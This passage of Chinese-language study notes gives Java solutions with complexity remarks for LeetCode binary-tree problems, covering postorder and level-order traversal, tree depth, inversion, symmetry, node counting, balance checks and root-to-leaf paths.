tmp.right;\n        }\n        return res;\n    }\n}\n```\n\n#### 3.Morris\n\n。。。\n\n### [145. 二叉树的后序遍历](https://leetcode.cn/problems/binary-tree-postorder-traversal/)\n\n> 先遍历左子树，再遍历右子树，**最后输出父节点**\n\n#### 1.递归\n\n```java\n/**\n *时间：O(n)\n *空间：O(h)\n**/\nclass Solution {\n    public List<Integer> postorderTraversal(TreeNode root) {\n        List<Integer> res = new ArrayList<>();\n        dfs(root, res);\n        return res;\n    }\n\n    public void dfs(TreeNode root ,List<Integer> res){\n        if(root == null){\n            return;\n        }\n        dfs(root.left, res);\n        dfs(root.right, res);\n        res.add(root.val);\n    }\n}\n```\n\n#### 2.迭代\n\n> 1. 弹栈顶输出\n> 2. 如有左，压入左\n> 3. 如有右，压入右\n\n```java\n/**\n *时间：O(n)\n *空间：O(h)\n**/\nclass Solution {\n  public List<Integer> postorderTraversal(TreeNode root) {\n          List<Integer> res = new ArrayList<>();\n          if (root == null) {\n              return res;\n          }\n          Deque<TreeNode> stack = new LinkedList<>();\n          TreeNode prev = null;\n          while (!stack.isEmpty() || root != null) {\n              while (root != null) { // 将左子树全部入栈\n                  stack.push(root);\n                  root = root.left;\n              }\n              root = stack.pop(); // 拿取栈顶节点\n              if (root.right == null || root.right == prev) {\n                  res.add(root.val);\n                  prev = root;\n                  root = null;\n              } else {\n                  // 重新把根节点入栈，处理完右子树还要回来处理根节点\n                  stack.push(root);\n                  // 当前节点为右子树\n                  root = root.right;\n              }\n          }\n          return res;\n    }\n}\n\nclass Solution {\n    public List<Integer> postorderTraversal(TreeNode root) {\n        List<Integer> res = new ArrayList<>();\n        Deque<TreeNode> stack = new LinkedList<>();\n        if(root == null){\n            return res;\n        }\n        // 如果当前处理节点不为空或者栈中有数据则继续处理\n        stack.push(root);\n        while (!stack.isEmpty()) {\n            TreeNode tmp = stack.pop();\n            res.add(tmp.val);\n            if(tmp.left != null) stack.push(tmp.left);\n            if(tmp.right != null) stack.push(tmp.right); //出栈根右左\n        }\n        Collections.reverse(res);//反转之后：左右根\n        return res;\n    }\n}    \n```\n\n#### 3.Morris\n\n### [102. 二叉树的层序遍历](https://leetcode.cn/problems/binary-tree-level-order-traversal/)\n\n##### 1.递归\n\n```java\n/**\n *时间：O(n)\n *空间：O(h)\n**/\nclass Solution {\n  public List<List<Integer>> levelOrder(TreeNode root) {\n        List<List<Integer>> res = new ArrayList<List<Integer>>();\n        dfs(root, 0, res);\n        return res;\n    }\n\n    public void dfs(TreeNode root, Integer deep, List<List<Integer>> res) {\n        if (root == null) return;\n        deep++;\n        if (res.size() < deep) {\n            //当层级增加时，res的Item也增加\n            List<Integer> item = new ArrayList<Integer>();\n            res.add(item);\n        }\n        //利用res的索引值进行层级界定\n        res.get(deep - 1).add(root.val);\n\n        dfs(root.left, deep, res);\n        dfs(root.right, deep, res);\n    }\n}\n```\n\n##### 2.迭代\n\n```java\n/**\n *时间：O(n)\n *空间：O(n)\n**/\n//借助队列\nclass Solution {\n    public List<List<Integer>> levelOrder(TreeNode root) {\n        List<List<Integer>> res = new ArrayList<List<Integer>>();\n        if (root == null) {\n            return res;\n        }\n        Queue<TreeNode> queue = new LinkedList<TreeNode>();\n        queue.offer(root);\n        while (!queue.isEmpty()) {\n            List<Integer> level = new ArrayList<Integer>();\n            int currentLevelSize = queue.size();\n            for (int i = 1; i <= currentLevelSize; ++i) {\n                TreeNode node = queue.poll();\n                level.add(node.val);\n                if (node.left != null) {\n                    queue.offer(node.left);\n                }\n                if (node.right != null) {\n                    queue.offer(node.right);\n                }\n            }\n            res.add(level);\n        }\n        return res;\n    }\n}\n```\n\n### 层序遍历相关题目\n\n#### [107. 二叉树的层序遍历 II ](https://leetcode.cn/problems/binary-tree-level-order-traversal-ii/)\n\n给你二叉树的根节点 `root` ，返回其节点值 **自底向上的层序遍历** 。 （即按从叶子节点所在层到根节点所在的层，逐层从左向右遍历）\n\n```java\nclass Solution {\n    public List<List<Integer>> levelOrderBottom(TreeNode root) {\n        List<List<Integer>> res = new ArrayList<List<Integer>>();\n        if (root == null) {\n            return res;\n        }\n        Queue<TreeNode> queue = new LinkedList<TreeNode>();\n        queue.offer(root);\n        while (!queue.isEmpty()) {\n            List<Integer> level = new ArrayList<Integer>();\n            int currentLevelSize = queue.size();\n            for (int i = 1; i <= currentLevelSize; ++i) {\n                TreeNode node = queue.poll();\n                level.add(node.val);\n                if (node.left != null) {\n                    queue.offer(node.left);\n                }\n                if (node.right != null) {\n                    queue.offer(node.right);\n                }\n            }\n            // res.add(level);\n            res.add(0, level);//头插法\n        }\n        // Collections.reverse(res);\n        return res;\n    }\n}\n```\n\n#### [199. 二叉树的右视图](https://leetcode.cn/problems/binary-tree-right-side-view/description/)\n\n给定一个二叉树的 **根节点** `root`，想象自己站在它的右侧，按照从顶部到底部的顺序，返回从右侧所能看到的节点值。\n\n**示例 1:**\n\n```properties\n输入: [1,2,3,null,5,null,4]\n输出: [1,3,4]\n```\n\n**示例 2:**\n\n```properties\n输入: [1,null,3]\n输出: [1,3]\n```\n\n**示例 3:**\n\n```properties\n输入: []\n输出: []\n```\n**方法一：BFS**\n\n用 BFS 层序遍历算法，每一层的最后一个节点就是二叉树的右侧视图。我们可以把 BFS 反过来，从右往左遍历每一行，进一步提升效率。\n\n```java\nclass Solution {\n    public List<Integer> rightSideView(TreeNode root) {\n        List<Integer> res = new ArrayList<>();\n        if(root == null){\n            return res;\n        }\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            // 每一层头部就是最右侧的元素\n            TreeNode last = queue.peek();\n            for(int i =0; i < n; i++){\n                TreeNode node = queue.poll();\n                // 控制每一层从右向左遍历\n                if(node.right != null) {\n                    queue.offer(node.right);\n                }\n                if(node.left != null){\n                    queue.offer(node.left);\n                } \n            }\n            res.add(last.val);\n              \n        }\n        return res;\n    }\n}\n```\n\n**方法二：DFS**\n\n用 DFS 递归遍历算法，同样需要反过来，先递归 `root.right` 再递归 `root.left`，同时用 `res` 记录每一层的最右侧节点作为右侧视图。\n\n```java\n\n\n class Solution {\n  \n    List<Integer> res = new ArrayList<>();\n  \n    public List<Integer> rightSideView(TreeNode root) {\n        dfs(root, 0); // 从根节点开始访问，根节点深度是0\n        return res;\n    }\n\n    private void dfs(TreeNode root, int depth) {\n        if (root == null) {\n            return;\n        }\n        // 先访问 当前节点，再递归地访问 右子树 和 左子树。\n        if (depth == res.size()) {   \n            res.add(root.val);\n        }\n        depth++;\n        dfs(root.right, depth);\n        dfs(root.left, depth);\n    }\n}\n```\n\n#### [637. 二叉树的层平均值](https://leetcode.cn/problems/average-of-levels-in-binary-tree/description/)\n\n给定一个非空二叉树的根节点 `root` , 以数组的形式返回每一层节点的平均值。\n\n**示例 1：**\n\n```properties\n输入：root = [3,9,20,null,null,15,7]\n输出：[3.00000,14.50000,11.00000]\n```\n\n**示例 2:**\n\n```properties\n输入：root = [3,9,20,15,7]\n输出：[3.00000,14.50000,11.00000]\n```\n\n```java\nclass Solution {\n    public List<Double> averageOfLevels(TreeNode root) {\n        List<Double> res = new ArrayList<>();\n        if(root == null) return res;\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            double sum = 0;\n            for(int i = 0; i < n; i++){\n                TreeNode node = queue.poll();\n                sum += node.val;\n                if(node.left != null) queue.offer(node.left);\n                if(node.right != null) queue.offer(node.right);\n            }\n            res.add(sum / n);\n        }\n        return res;\n    }\n}\n```\n\n#### [429. N 叉树的层序遍历](https://leetcode.cn/problems/n-ary-tree-level-order-traversal/)\n\n给定一个 N 叉树，返回其节点值的*层序遍历*。（即从左到右，逐层遍历）。\n\n树的序列化输入是用层序遍历，每组子节点都由 null 值分隔（参见示例）。\n\n**示例 1：**\n\n<img src=\"https://assets.leetcode.com/uploads/2018/10/12/narytreeexample.png\" style=\"zoom:50%;\" />\n\n```\n输入：root = [1,null,3,2,4,null,5,6]\n输出：[[1],[3,2,4],[5,6]]\n```\n\n**示例 2：**\n\n<img src=\"https://assets.leetcode.com/uploads/2019/11/08/sample_4_964.png\" style=\"zoom:60%;\" />\n\n```\n输入：root = [1,null,2,3,4,5,null,null,6,7,null,8,null,9,10,null,null,11,null,12,null,13,null,null,14]\n输出：[[1],[2,3,4,5],[6,7,8,9,10],[11,12,13],[14]]\n```\n\n```java\nclass Solution {\n    public List<List<Integer>> levelOrder(Node root) {\n        List<List<Integer>> res = new ArrayList<>();\n        if(root == null) return res;\n        Queue<Node> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            List<Integer> level = new ArrayList<>();\n            for(int i = 0; i < n; i++){\n                Node node = queue.poll();\n                level.add(node.val);\n                for(Node child : node.children){\n                    queue.offer(child);\n                }\n            }\n            res.add(level);\n        }\n        return res;  \n    }\n}\n```\n\n#### [515. 在每个树行中找最大值 ](https://leetcode.cn/problems/find-largest-value-in-each-tree-row/description/)\n\n给定一棵二叉树的根节点 `root` ，请找出该二叉树中每一层的最大值。\n\n```java\nclass Solution {\n    public List<Integer> largestValues(TreeNode root) {\n        List<Integer> res = new ArrayList<>();\n        if(root ==null) return res;\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            // 记录这一层的最大值\n            int levelMax = Integer.MIN_VALUE;\n            for(int i = 0; i < n; i++){\n                TreeNode cur = queue.poll();\n                levelMax = Math.max(levelMax, cur.val);\n                if (cur.left != null)\n                    queue.offer(cur.left);\n                if (cur.right != null)\n                    queue.offer(cur.right);\n            }\n            res.add(levelMax);\n        }\n        return res;\n    }\n}\n```\n\n#### [116. 填充每个节点的下一个右侧节点指针](https://leetcode.cn/problems/populating-next-right-pointers-in-each-node/description/)\n\n给定一个 **完美二叉树** ，其所有叶子节点都在同一层，每个父节点都有两个子节点。二叉树定义如下：\n\n```java\nstruct Node {\n  int val;\n  Node *left;\n  Node *right;\n  Node *next;\n}\n```\n\n填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 `NULL`。初始状态下，所有 next 指针都被设置为 `NULL`。\n\n**示例 1：**\n\n![](https://assets.leetcode.com/uploads/2019/02/14/116_sample.png)\n\n```properties\n输入：root = [1,2,3,4,5,6,7]\n输出：[1,#,2,3,#,4,5,6,7,#]\n解释：给定二叉树如图 A 所示，你的函数应该填充它的每个 next 指针，以指向其下一个右侧节点，如图 B 所示。序列化的输出按层序遍历排列，同一层节点由 next 指针连接，'#' 标志着每一层的结束。\n\n```\n\n**示例 2:**\n\n```properties\n输入：root = []\n输出：[]\n```\n\n**进阶：**\n\n-   你只能使用常量级额外空间。\n-   使用递归解题也符合要求，本题中递归程序占用的栈空间不算做额外的空间复杂度。\n\n**方法一：层序遍历**\n\n```java\n// 时间复杂度：O(N)\n// 空间复杂度：O(N)\nclass Solution {\n    public Node connect(Node root) {\n        if(root == null){\n            return root;\n        }\n        Queue<Node> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            for(int i = 0; i < n; i++){\n                Node node = queue.poll();\n                if(i < n - 1){ //最后一个节点不用设置\n                    node.next = queue.peek(); //关键代码\n                }\n                if(node.left != null) queue.offer(node.left);\n                if(node.right != null) queue.offer(node.right);\n            }\n        }\n        return root;\n    }\n}\n\n\n```\n\n**方法二：使用已建立的** **next** **指针**\n\n一棵树中，存在两种类型的 next 指针。\n\n第一种情况是连接同一个父节点的两个子节点。可以通过同一个节点直接访问到，执行下面操作即可完成连接。\n\n<img src=\"https://assets.leetcode-cn.com/solution-static/116/1.png\" style=\"zoom:33%;\" />\n\n```java\nnode.left.next = node.right\n```\n\n第二种情况在不同父亲的子节点之间建立连接，这种情况不能直接连接。如果我们能将这一层的上一层串联好。那么可以通过父节点的`next`找到邻居，完成串联。\n\n<img src=\"https://assets.leetcode-cn.com/solution-static/116/2.png\" style=\"zoom: 33%;\" />\n\n```java\nroot.right.next == root.next.left\n```\n\n```java\n// 时间复杂度：O(N)\n// 空间复杂度：O(1)\nclass Solution {\n    public Node connect(Node root) {\n        if (root == null) {\n            return root;\n        }\n        // 从根节点开始\n        Node leftmost = root;\n        while (leftmost.left != null) {\n            // 遍历这一层节点组成的链表，为下一层的节点更新 next 指针\n            Node head = leftmost;\n            while (head != null) {\n                // CONNECTION 1\n                head.left.next = head.right;\n                // CONNECTION 2\n                if (head.next != null) {\n                    head.right.next = head.next.left;\n                }\n                // 指针向后移动\n                head = head.next;\n            }\n            // 去下一层的最左的节点\n            leftmost = leftmost.left;\n        }\n        return root;\n    }\n}\n```\n\n#### [117. 填充每个节点的下一个右侧节点指针 II](https://leetcode.cn/problems/populating-next-right-pointers-in-each-node-ii/description/)\n\n给定一个 **完美二叉树** ，其所有叶子节点都在同一层，每个父节点都有两个子节点。二叉树定义如下：\n\n```\nstruct Node {\n  int val;\n  Node *left;\n  Node *right;\n  Node *next;\n}\n```\n\n填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 `NULL`。\n\n初始状态下，所有 next 指针都被设置为 `NULL`。\n\n**示例 1：**\n\n![](https://assets.leetcode.com/uploads/2019/02/14/116_sample.png)\n\n```\n输入：root = [1,2,3,4,5,6,7]\n输出：[1,#,2,3,#,4,5,6,7,#]\n解释：给定二叉树如图 A 所示，你的函数应该填充它的每个 next 指针，以指向其下一个右侧节点，如图 B 所示。序列化的输出按层序遍历排列，同一层节点由 next 指针连接，'#' 标志着每一层的结束。\n```\n\n**示例 2:**\n\n```\n输入：root = []\n输出：[]\n```\n\n**方法1：层序遍历**\n\n```java\nclass Solution {\n    public Node connect(Node root) {\n        if(root == null){\n            return root;\n        }\n        Queue<Node> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            for(int i = 0; i < n; i++){\n                Node node = queue.poll();\n                if(i < n - 1){ //最后一个节点不用设置\n                    node.next = queue.peek(); //关键代码\n                }\n                if(node.left != null) queue.offer(node.left);\n                if(node.right != null) queue.offer(node.right);\n            }\n        }\n        return root;\n    }\n}\n```\n\n**方法二：使用已建立的** **next** **指针**\n\n```java\ncur.left.next = cur.right;\ncur.right.next = cur.next.left;\n```\n\n。。。\n\n### [104. 二叉树的最大深度](https://leetcode.cn/problems/maximum-depth-of-binary-tree/)\n\n给定一个二叉树，找出其最大深度。\n\n二叉树的深度为根节点到最远叶子节点的最长路径上的节点数。\n\n**说明:** 叶子节点是指没有子节点的节点。\n\n**示例：**\n给定二叉树 `[3,9,20,null,null,15,7]`，\n\n```\n    3\n   / \\\n  9  20\n    /  \\\n   15   7\n```\n\n返回它的最大深度 3 。\n\n------\n#### 1.递归\n\n```java\n// 左子树和右子树的最大深度 l 和 r，那么该二叉树的最大深度即为 max⁡(l,r)+1\n// 时间复杂度：O(N)\n// 空间复杂度：O(H)\nclass Solution {\n    public int maxDepth(TreeNode root) {\n        if (root == null) {\n            return 0;\n        } \n        int leftDepth = maxDepth(root.left);\n        int rightDepth = maxDepth(root.right);\n        return Math.max(leftDepth, rightDepth) + 1;\n    }\n}\n```\n\n#### 2.迭代\n\n\n```java\n// 时间复杂度：O(N)\n// 空间复杂度：O(N)\nclass Solution {\n    public int maxDepth(TreeNode root) {\n        if (root == null) {\n            return 0;\n        }\n        int count = 0;\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            count++;\n            for(int i = 0; i < n; i++){\n                TreeNode node = queue.poll();\n                if(node.left != null) queue.offer(node.left);\n                if(node.right != null) queue.offer(node.right);\n            }\n        }\n        return count;\n    }\n}\n```\n\n### [559. N 叉树的最大深度](https://leetcode.cn/problems/maximum-depth-of-n-ary-tree/)\n\n给定一个 N 叉树，找到其最大深度。\n\n最大深度是指从根节点到最远叶子节点的最长路径上的节点总数。\n\nN 叉树输入按层序遍历序列化表示，每组子节点由空值分隔（请参见示例）。\n\n**示例 1：**\n\n![](https://assets.leetcode.com/uploads/2018/10/12/narytreeexample.png)\n\n```properties\n输入：root = [1,null,3,2,4,null,5,6]\n输出：3\n```\n\n**示例 2：**\n\n![](https://assets.leetcode.com/uploads/2019/11/08/sample_4_964.png)\n\n```properties\n输入：root = [1,null,2,3,4,5,null,null,6,7,null,8,null,9,10,null,null,11,null,12,null,13,null,null,14]\n输出：5\n```\n\n------\n\n#### 1.递归\n\n```java\nclass Solution {\n    public int maxDepth(Node root) {\n        if(root == null){\n            return 0;\n        }\n        int depth = 0;\n        if(root.children != null){\n            for(Node child : root.children){\n                depth = Math.max(depth, maxDepth(child));\n            }\n        }\n        return depth + 1;   \n    }\n}\n```\n\n#### 2.迭代\n\n```java\n// 时间复杂度：O(N)\n// 空间复杂度：O(N)\nclass Solution {\n    public int maxDepth(Node root) {\n        if(root == null){\n            return 0;\n        }\n        int depth = 0;\n        Queue<Node> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            depth++;\n            for(int i = 0; i < n; i++){\n                Node node = queue.poll();\n                if(node.children != null) {\n                    for(Node child : node.children){\n                        queue.offer(child);\n                    }\n                } \n            }\n        }\n        return depth; \n    }\n}\n```\n\n\n\n\n\n\n\n### [111. 二叉树的最小深度](https://leetcode.cn/problems/minimum-depth-of-binary-tree/)\n\n给定一个二叉树，找出其最小深度。\n\n最小深度是从根节点到最近叶子节点的最短路径上的节点数量。\n\n**说明：**叶子节点是指没有子节点的节点。\n\n**示例 1：**\n\n![](https://assets.leetcode.com/uploads/2020/10/12/ex_depth.jpg)\n\n```\n输入：root = [3,9,20,null,null,15,7]\n输出：2\n```\n\n**示例 2：**\n\n```\n输入：root = [2,null,3,null,4,null,5,null,6]\n输出：5\n```\n\n------\n\n#### 1.递归\n\n```java\n// 时间复杂度：O(N)\n// 空间复杂度：O(H)\nclass Solution {\n    public int minDepth(TreeNode root) {\n        if(root == null) return 0;\n        //这道题递归条件里分为三种情况\n        //1.左孩子和右孩子都为空的情况，说明到达了叶子节点，直接返回1即可\n        if(root.left == null && root.right == null) return 1;\n      \n        //2.如果左孩子和右孩子其中一个为空，那么需要返回比较大的那个孩子的深度        \n        int m1 = minDepth(root.left);\n        int m2 = minDepth(root.right);\n        //其中一个节点为空，说明m1和m2有一个必然为0，所以可以返回m1 + m2 + 1;\n        if(root.left == null || root.right == null) return m1 + m2 + 1;\n        \n        //3.最后一种情况，也就是左右孩子都不为空，返回最小深度+1即可\n        return Math.min(m1, m2) + 1; \n    }\n}\n\n//优化\nclass Solution {\n    public int minDepth(TreeNode root) {\n        if(root == null) return 0;\n        int m1 = minDepth(root.left);\n        int m2 = minDepth(root.right);\n        //1.如果左孩子和右孩子有为空的情况，直接返回m1+m2+1\n        //2.如果都不为空，返回较小深度+1\n        return root.left == null || root.right == null ? m1 + m2 + 1 : Math.min(m1,m2) + 1;\n    }\n}\n\n```\n\n#### 2.迭代\n\n```java\n// 时间复杂度：O(N)\n// 空间复杂度：O(N)\nclass Solution {\n    public int minDepth(TreeNode root) {\n        if(root == null) return 0;\n        Queue<TreeNode> queue = new LinkedList<>();\n        int depth = 1;\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            depth++;\n            while(n > 0){\n                TreeNode node = queue.poll();\n                if(node.left != null) queue.offer(node.left);\n                if(node.right != null) queue.offer(node.right);\n                if(node.left == null && node.right == null){\n                    return depth;\n                }\n                n--;\n            }\n        }\n        return depth;\n    }\n}\n```\n\n\n\n### [226. 翻转二叉树 ](https://leetcode.cn/problems/invert-binary-tree/)\n\n给你一棵二叉树的根节点 `root` ，翻转这棵二叉树，并返回其根节点。\n\n**示例 1：**\n\n![](https://assets.leetcode.com/uploads/2021/03/14/invert1-tree.jpg)\n\n```properties\n输入：root = [4,2,7,1,3,6,9]\n输出：[4,7,2,9,6,3,1]\n```\n\n**示例 2：**\n\n![](https://assets.leetcode.com/uploads/2021/03/14/invert2-tree.jpg)\n\n```properties\n输入：root = [2,1,3]\n输出：[2,3,1]\n```\n\n**示例 3：**\n\n```properties\n输入：root = []\n输出：[]\n```\n\n------\n\n#### 1.递归\n\n```java\n// 时间复杂度：O(N)\n// 空间复杂度：O(N)\nclass Solution {\n    public TreeNode invertTree(TreeNode root) {\n        traverse(root);\n        return root;\n    }\n\n    public void traverse(TreeNode root){\n        if(root == null){\n            return;\n        }\n        TreeNode tmp = root.left;\n        root.left = root.right;\n        root.right = tmp;\n\n        traverse(root.left);\n        traverse(root.right);\n    }\n}\n\n//优化\nclass Solution {\n    public TreeNode invertTree(TreeNode root) {\n        if (root == null) {\n            return null;\n        }\n        TreeNode left = invertTree(root.left);\n        TreeNode right = invertTree(root.right);\n        root.left = right;\n        root.right = left;\n        return root;\n    }\n}\n```\n\n#### 2.迭代\n\n```java\n//层序遍历\nclass Solution {\n\tpublic TreeNode invertTree(TreeNode root) {\n\t\tif(root==null) {\n\t\t\treturn null;\n\t\t}\n\t\t//将二叉树中的节点逐层放入队列中，再迭代处理队列中的元素\n\t\tLinkedList<TreeNode> queue = new LinkedList<TreeNode>();\n\t\tqueue.add(root);\n\t\twhile(!queue.isEmpty()) {\n\t\t\t//每次都从队列中拿一个节点，并交换这个节点的左右子树\n\t\t\tTreeNode tmp = queue.poll();\n\t\t\tTreeNode left = tmp.left;\n\t\t\ttmp.left = tmp.right;\n\t\t\ttmp.right = left;\n\t\t\t//如果当前节点的左子树不为空，则放入队列等待后续处理\n\t\t\tif(tmp.left!=null) {\n\t\t\t\tqueue.add(tmp.left);\n\t\t\t}\n\t\t\t//如果当前节点的右子树不为空，则放入队列等待后续处理\n\t\t\tif(tmp.right!=null) {\n\t\t\t\tqueue.add(tmp.right);\n\t\t\t}\n\t\t\t\n\t\t}\n\t\t//返回处理完的根节点\n\t\treturn root;\n\t}\n}\n```\n\n### [101. 对称二叉树](https://leetcode.cn/problems/symmetric-tree/)\n\n给你一个二叉树的根节点 `root` ， 检查它是否轴对称。\n\n**示例 1：**\n\n![](https://assets.leetcode.com/uploads/2021/02/19/symtree1.jpg)\n\n```properties\n输入：root = [1,2,2,3,4,4,3]\n输出：true\n```\n\n**示例 2：**\n\n![](https://assets.leetcode.com/uploads/2021/02/19/symtree2.jpg)\n\n```properties\n输入：root = [1,2,2,null,3,null,3]\n输出：false\n```\n\n------\n\n#### 1.递归\n\n```java\n// 递归\n// 时间复杂度：O(N)\n// 空间复杂度：O(H)\nclass Solution {\n    public boolean isSymmetric(TreeNode root) {\n        if(root == null) return true;\n        return check(root.left, root.right);\n    }\n\n    // 检查两棵子树是否对称\n    boolean check(TreeNode left, TreeNode right){\n        //递归的终止条件\n        //两个节点都为空\n\t\t    //或者两个节点中有一个为空\n\t\t    //或者两个节点的值不相等\n        if(left == null && right == null) return true;\n        if(left == null || right == null) return false;\n        if(left.val != right.val) return false;\n        // 左右子节点需要对称相同\n        return check(left.left, right.right) && check(left.right, right.left);\n    }\n}\n\n//优化\nclass Solution {\n    public boolean isSymmetric(TreeNode root) {\n        if(root == null) return true;\n        return check(root.left, root.right);\n    }\n    boolean check(TreeNode left, TreeNode right){\n        if (left == null || right == null) return left == right;\n        if(left.val != right.val) return false;\n        return check(left.left, right.right) && check(left.right, right.left);\n    }\n}\n```\n\n#### 2.迭代\n\n```java\n// 时间复杂度：O(N)\n// 空间复杂度：O(N)\nclass Solution {\n\tpublic boolean isSymmetric(TreeNode root) {\n\t\tLinkedList<TreeNode> queue = new LinkedList<TreeNode>();\n\t\t//将根节点的左右孩子放到队列中\n\t\tqueue.offer(root.left);\n\t\tqueue.offer(root.right);\n\t\twhile(queue.size() > 0) {\n\t\t\t//从队列中取出两个节点，再比较这两个节点\n\t\t\tTreeNode left = queue.poll();\n\t\t\tTreeNode right = queue.poll();\n\t\t\t//如果两个节点都为空就继续循环，两者有一个为空就返回false\n\t\t\tif(left == null && right == null) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif(left == null || right == null) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\tif(left.val != right.val) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\t//将左节点的左孩子， 右节点的右孩子放入队列\n\t\t\tqueue.offer(left.left);\n\t\t\tqueue.offer(right.right);\n\t\t\t//将左节点的右孩子，右节点的左孩子放入队列\n\t\t\tqueue.offer(left.right);\n\t\t\tqueue.offer(right.left);\n\t\t}\n\t\treturn true;\n\t}\n}\n```\n\n### [222. 完全二叉树的节点个数 ](https://leetcode.cn/problems/count-complete-tree-nodes/)\n\n给你一棵 **完全二叉树** 的根节点 `root` ，求出该树的节点个数。\n\n完全二叉树的定义如下：在完全二叉树中，除了最底层节点可能没填满外，其余每层节点数都达到最大值，并且最下面一层的节点都集中在该层最左边的若干位置。若最底层为第 `h` 层，则该层包含 `1~2^h` 个节点。 \n\n**示例 1：**\n\n![](https://assets.leetcode.com/uploads/2021/01/14/complete.jpg)\n\n```properties\n输入：root = [1,2,3,4,5,6]\n输出：6\n```\n\n**示例 2：**\n\n```properties\n输入：root = []\n输出：0\n```\n\n**示例 3：**\n\n```properties\n输入：root = [1]\n输出：1\n```\n\n------\n\n#### 1.递归\n\n```java\nclass Solution {\n    public int countNodes(TreeNode root) {\n        if(root == null){\n            return 0;\n        }\n        int countleft = countNodes(root.left);\n        int countright = countNodes(root.right);\n        return countleft + countright + 1;\n    }\n}\n\n//优化\n// 完全可以利用满二叉树的性质来进行求解   满二叉树的求解法则是\npublic int countNodes(TreeNode root) {\n    if(root == null) return 0;\n    // 返回左右子树的高度\n    int left = countLevel(root.left);\n    int right = countLevel(root.right);\n    if(left == right){\n        // 说明左侧为满二叉树，[1 << left == (int)Math.pow(2, left)]\n        return countNodes(root.right) + (1 << left);\n     } else{\n        // 说明右侧为满二叉树\n        return countNodes(root.left) + (1 << right);\n    }\n}\nint countLevel(TreeNode root) {\n    int level = 0;\n    while(root != null){\n      root = root.left;\n      level++;\n    }\n    return level;\n}\n```\n\n#### 2.迭代\n\n```java\nclass Solution {\n    public int countNodes(TreeNode root) {\n        if(root == null){\n            return 0;\n        }\n        int res = 0;\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            res += n;\n            for(int i = 0; i < n; i++){\n                TreeNode node = queue.poll();\n                if(node.left != null) queue.offer(node.left);\n                if(node.right != null) queue.offer(node.right);\n            }\n        }\n        return res;\n    }\n}\n```\n\n### [110. 平衡二叉树](https://leetcode.cn/problems/balanced-binary-tree/)\n\n给定一个二叉树，判断它是否是高度平衡的二叉树。\n\n本题中，一棵高度平衡二叉树定义为：一个二叉树*每个节点* 的左右两个子树的高度差的绝对值不超过 1 。 \n\n**示例 1：**\n\n![](https://assets.leetcode.com/uploads/2020/10/06/balance_1.jpg)\n\n```properties\n输入：root = [3,9,20,null,null,15,7]\n输出：true\n```\n\n**示例 2：**\n\n![](https://assets.leetcode.com/uploads/2020/10/06/balance_2.jpg)\n\n```properties\n输入：root = [1,2,2,3,3,null,null,4,4]\n输出：false\n```\n\n**示例 3：**\n\n```properties\n输入：root = []\n输出：true\n```\n\n------\n\n#### 1.从顶至底（暴力法）\n\n```java\n// 时间复杂度：O(n^2)\n// 空间复杂度：O(n)\nclass Solution {\n    public boolean isBalanced(TreeNode root) {\n        if(root == null) {\n            return true;\n        }\n        if (Math.abs(height(root.left) - height(root.right)) > 1) {\n            return false;\n        }\n        return isBalanced(root.left) && isBalanced(root.right);   \n    }\n  \n    //节点高度\n    int height(TreeNode root){\n        if (root == null) return 0;\n        int lHeight = height(root.left);\n        int rHeight = height(root.right);\n        return Math.max(lHeight, rHeight) + 1;\n    }\n}\n```\n\n#### 2.从底至顶（提前阻断）\n\n```java\n// 时间复杂度：O(n)\n// 空间复杂度：O(n)\nclass Solution {\n    public boolean isBalanced(TreeNode root) {\n        return height(root) != -1;\n    }\n\n    int height(TreeNode root) {\n        if (root == null) return 0;\n        int lHeight = height(root.left);\n        int rHeight = height(root.right);\n        // 如果一棵子树是平衡的，则返回其高度，否则返回 −1。\n       // 如果存在一棵子树不平衡，则整个二叉树一定不平衡。\n        if (lHeight == -1 || rHeight == -1 || Math.abs(lHeight - rHeight) > 1) {\n            return -1;\n        } else {\n            return Math.max(lHeight, rHeight) + 1;\n        }\n    }\n}\n```\n\n### [257. 二叉树的所有路径](https://leetcode.cn/problems/binary-tree-paths/)\n\n给你一个二叉树的根节点 `root` ，按 **任意顺序** ，返回所有从根节点到叶子节点的路径。\n\n**叶子节点** 是指没有子节点的节点。\n\n**示例 1：**\n\n![](https://assets.leetcode.com/uploads/2021/03/12/paths-tree.jpg)\n\n```properties\n输入：root = [1,2,3,null,5]\n输出：[\"1->2->5\",\"1->3\"]\n```\n\n**示例 2：**\n\n```properties\n输入：root = [1]\n输出：[\"1\"]\n```\n\n------\n\n#### 1.深度优先\n\n```java\n// 时间复杂度：O(n^2)\n// 空间复杂度：O(n^2)\nclass Solution {\n    public List<String> binaryTreePaths(TreeNode root) {\n        List<String> res = new ArrayList<>();\n        dfs(root, \"\", res);\n        return res;\n    }\n\n    private void dfs(TreeNode root, String path, List<String> res) {\n         //如果为空，直接返回\n         if (root == null) return;\n         //如果是叶子节点，说明找到了一条路径，把它加入到res中\n         if (root.left == null && root.right == null) {\n             res.add(path + root.val);\n             return;\n         }\n         //如果不是叶子节点，在分别遍历他的左右子节点\n         dfs(root.left, path + root.val + \"->\", res);\n         dfs(root.right, path + root.val + \"->\", res);\n    }\n}\n```\n\n#### 2.广度优先\n\n```java\n// 